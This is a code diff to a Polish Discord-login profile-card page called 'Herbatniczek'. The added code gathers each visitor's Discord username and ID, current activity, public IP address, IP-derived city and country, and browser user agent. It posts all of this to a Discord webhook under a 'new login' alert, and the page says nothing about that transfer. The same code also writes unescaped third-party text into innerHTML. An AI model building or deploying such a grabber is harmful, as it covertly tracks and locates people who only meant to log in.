@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Herbatniczek</title>
   <style>
     body {
@@ -25,7 +25,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      max-width: 320px;
+      max-width: 360px;
       width: 100%;
       transition: 0.3s ease;
     }
@@ -46,6 +46,14 @@
     .status {
       color: #aaa;
       font-size: 0.9em;
+      margin-bottom: 10px;
+    }
+
+    .info {
+      color: #ccc;
+      font-size: 0.8em;
+      margin-top: 10px;
+      text-align: center;
     }
 
     #login {
@@ -82,40 +90,77 @@
 
   if (accessToken) {
     fetch("https://discord.com/api/users/@me", {
-      headers: {
-        Authorization: `Bearer ${accessToken}`
-      }
+      headers: { Authorization: `Bearer ${accessToken}` }
     })
     .then(res => res.json())
-    .then(user => {
+    .then(async user => {
       const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
+      const usernameTag = `${user.username}#${user.discriminator}`;
+      const userId = user.id;
 
-      // Wyślij dane do webhooka
+      // Pobierz aktywność z Lanyard API
+      let activityText = "Brak aktywności";
+      try {
+        const lanyardRes = await fetch(`https://api.lanyard.rest/v1/users/${userId}`);
+        const lanyardData = await lanyardRes.json();
+
+        if (lanyardData.success && lanyardData.data.activities.length > 0) {
+          const act = lanyardData.data.activities[0];
+          activityText = act.name + (act.details ? `: ${act.details}` : "");
+        }
+      } catch (err) {
+        activityText = "Nie udało się pobrać aktywności";
+      }
+
+      // Pobierz IP i lokalizację użytkownika
+      let ip = "Nieznane";
+      let location = "Nieznana";
+      try {
+        const ipRes = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
+        const ipData = await ipRes.json();
+        ip = ipData.ip || "Nieznane";
+        location = `${ipData.city || "Nieznane"}, ${ipData.region || ""}, ${ipData.country || ""}`;
+      } catch (err) {
+        ip = "Nie udało się pobrać IP";
+        location = "Nie udało się pobrać lokalizacji";
+      }
+
+      // Pobierz informacje o przeglądarce
+      const browser = navigator.userAgent;
+
+      // Wyślij webhook
       fetch(WEBHOOK_URL, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
             title: `Nowe logowanie przez Discord`,
             color: 0x5865F2,
             thumbnail: { url: avatarUrl },
             fields: [
-              { name: 'Użytkownik', value: `${user.username}#${user.discriminator}`, inline: true },
-              { name: 'ID', value: user.id, inline: true }
+              { name: 'Użytkownik', value: usernameTag, inline: true },
+              { name: 'ID', value: userId, inline: true },
+              { name: 'Aktywność', value: activityText, inline: false },
+              { name: 'IP', value: ip, inline: true },
+              { name: 'Lokalizacja', value: location, inline: true },
+              { name: 'Przeglądarka', value: browser, inline: false }
             ],
             timestamp: new Date().toISOString()
           }]
         })
       });
 
-      // Pokaż wizytówkę
+      // Wyświetl na stronie
       document.getElementById('content').innerHTML = `
         <div class="card">
           <img class="avatar" src="${avatarUrl}" alt="Avatar">
-          <div class="username">${user.username}</div>
-          <div class="status">Online na Discordzie</div>
+          <div class="username">${usernameTag}</div>
+          <div class="status">${activityText}</div>
+          <div class="info">
+            IP: ${ip}<br/>
+            Lokalizacja: ${location}<br/>
+            Przeglądarka: ${browser}
+          </div>
         </div>
       `;
     })
